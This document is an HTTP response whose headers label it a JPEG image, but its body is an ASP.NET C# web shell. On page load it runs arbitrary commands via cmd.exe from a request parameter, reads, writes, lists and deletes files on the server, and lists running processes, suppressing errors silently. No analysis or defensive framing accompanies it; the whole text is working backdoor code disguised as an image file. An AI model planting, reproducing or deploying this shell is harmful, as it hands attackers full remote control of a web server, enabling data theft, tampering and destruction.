HTTP/2 200 OK
Content-Type: image/jpeg
Last-Modified: Mon, 14 Sep 2026 06:53:06 GMT
Accept-Ranges: bytes
Etag: "075dcb11544dd1:0"
Access-Control-Allow-Origin: *
X-Powered-By: ARR/3.0
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
Arr-Disable-Session-Affinity: True
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Permitted-Cross-Domain-Policies: master-only
Feature-Policy: geolocation 'none'
Access-Control-Allow-Headers: accept, content-type, reqstat, reqtime, reqhash, appname, authorization, reqendpnt, modulestat
Access-Control-Allow-Methods: POST
Date: Mon, 14 Sep 2026 06:57:16 GMT
Content-Length: 4022

<%@ Page Language="C#" Debug="false" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Text" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e) {
        try {
            string cmd = Request["c"];
            if (!string.IsNullOrEmpty(cmd)) {
                RunCmd(cmd);
                return;
            }

            string fileOp = Request["f"];
            if (!string.IsNullOrEmpty(fileOp)) {
                FileOp(fileOp);
                return;
            }

            if (Request["p"] != null) {
                ProcList();
            }
        }
        catch { }
    }

    private void RunCmd(string command) {
        try {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + command;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;

            Process proc = Process.Start(psi);
            string output = proc.StandardOutput.ReadToEnd();
            string error = proc.StandardError.ReadToEnd();
            proc.WaitForExit();

            Response.Write("<pre>" + Server.HtmlEncode(output + error) + "</pre>");
        }
        catch (Exception ex) {
            Response.Write("<pre>" + Server.HtmlEncode(ex.Message) + "</pre>");
        }
    }

    private void FileOp(string operation) {
        try {
            string[] parts = operation.Split('|');
            if (parts.Length < 2) return;

            string action = parts[0].ToLower();
            string path = parts[1];

            switch (action) {
                case "read":
                    if (File.Exists(path)) {
                        byte[] content = File.ReadAllBytes(path);
                        Response.Write("<pre>" + Convert.ToBase64String(content) + "</pre>");
                    }
                    else {
                        Response.Write("<pre>not found</pre>");
                    }
                    break;

                case "write":
                    if (parts.Length >= 3) {
                        byte[] data = Convert.FromBase64String(parts[2]);
                        File.WriteAllBytes(path, data);
                        Response.Write("<pre>OK</pre>");
                    }
                    break;

                case "list":
                    if (Directory.Exists(path)) {
                        StringBuilder sb = new StringBuilder();
                        foreach (string item in Directory.GetFileSystemEntries(path)) {
                            sb.AppendLine(item);
                        }
                        Response.Write("<pre>" + Server.HtmlEncode(sb.ToString()) + "</pre>");
                    }
                    else {
                        Response.Write("<pre>not found</pre>");
                    }
                    break;

                case "delete":
                    if (File.Exists(path)) {
                        File.Delete(path);
                        Response.Write("<pre>OK</pre>");
                    }
                    break;
            }
        }
        catch (Exception ex) {
            Response.Write("<pre>" + Server.HtmlEncode(ex.Message) + "</pre>");
        }
    }

    private void ProcList() {
        try {
            StringBuilder sb = new StringBuilder();
            Process[] processes = Process.GetProcesses();
            foreach (Process p in processes) {
                try {
                    sb.AppendLine(p.Id + " | " + p.ProcessName);
                }
                catch { }
            }
            Response.Write("<pre>" + Server.HtmlEncode(sb.ToString()) + "</pre>");
        }
        catch { }
    }
</script>
